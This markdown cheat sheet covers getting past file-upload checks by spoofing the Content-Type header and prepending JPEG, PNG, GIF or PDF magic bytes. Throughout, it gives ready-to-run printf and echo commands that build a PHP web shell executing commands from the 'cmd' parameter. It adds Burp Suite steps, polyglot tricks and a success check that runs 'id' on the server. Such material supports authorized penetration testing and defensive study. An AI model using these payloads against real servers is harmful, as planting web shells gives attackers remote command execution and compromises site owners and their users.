# File Upload — Content-Type Manipulation + Magic Bytes

## When this applies

- Server validates the `Content-Type` header in the multipart/form-data part.
- Server reads the first N bytes of the file (magic bytes) to fingerprint the format.
- Both checks can be bypassed by spoofing the header AND adding correct magic bytes.

## Technique

Change `Content-Type` to a permitted value (image/jpeg, image/png) AND prepend the correct magic-byte sequence. Many servers do both checks; pass both with a hybrid file.

## Steps

### Changing MIME type in request

```http
# Original request
Content-Type: application/x-php

# Modified to bypass
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
Content-Type: text/plain
```

### Burp Suite modification

```
1. Intercept upload request
2. Locate multipart form data section
3. Find: Content-Type: application/x-php
4. Replace with: Content-Type: image/jpeg
5. Forward request
```

### Multiple Content-Type headers

```http
Content-Type: image/jpeg
Content-Type: application/x-php
```

### Common valid MIME types

```
image/jpeg
image/png
image/gif
image/bmp
image/webp
image/svg+xml
application/pdf
text/plain
application/octet-stream
```

### Magic bytes — JPEG

```
Hex: FF D8 FF E0
Add to shell:
printf '\xFF\xD8\xFF\xE0' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php
```

### Magic bytes — PNG

```
Hex: 89 50 4E 47 0D 0A 1A 0A
Add to shell:
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php
```

### Magic bytes — GIF

```
Hex: 47 49 46 38 39 61 (GIF89a)
Add to shell:
echo 'GIF89a' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php

# Alternative GIF87a
echo 'GIF87a' > exploit.php
```

### Magic bytes — PDF

```
Hex: 25 50 44 46 (%PDF)
echo '%PDF-1.4' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php
```

### File signature reference

| File Type | Magic Bytes (Hex) | ASCII |
|-----------|-------------------|-------|
| JPEG | FF D8 FF E0/E1/E2 | ÿØÿà |
| PNG | 89 50 4E 47 0D 0A 1A 0A | .PNG.... |
| GIF | 47 49 46 38 | GIF8 |
| PDF | 25 50 44 46 | %PDF |
| ZIP | 50 4B 03 04 | PK.. |
| BMP | 42 4D | BM |
| WEBP | 52 49 46 46 ... 57 45 42 50 | RIFF...WEBP |
| MP4 | 66 74 79 70 | ftyp |
| AVI | 52 49 46 46 ... 41 56 49 | RIFF...AVI |

### Creating hybrid files

```bash
# Combine image and PHP
cat valid-image.jpg exploit.php > hybrid.php

# JPEG + PHP
printf '\xFF\xD8\xFF\xE0' > hybrid.php
cat exploit.php >> hybrid.php

# PNG + PHP
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > hybrid.php
cat exploit.php >> hybrid.php
```

## Verifying success

- Server accepts the upload despite PHP-content (confirmed by retrieving the uploaded file).
- Hybrid file: image preview works AND `?cmd=id` returns command output (combined polyglot).
- No "invalid file type" error on the upload response.

## Common pitfalls

- Some servers re-process images (resize, strip metadata) — this destroys appended PHP. Use polyglot in EXIF metadata instead.
- Some validators check both Content-Type AND magic-byte AND extension — must spoof all three.
- Magic-byte alone fails if the validator parses past the header — use polyglot inside metadata fields.

## Tools

- Burp Suite Repeater (intercept + modify multipart)
- printf, cat (build hybrid files)
- exiftool (metadata polyglot)
- fuxploider
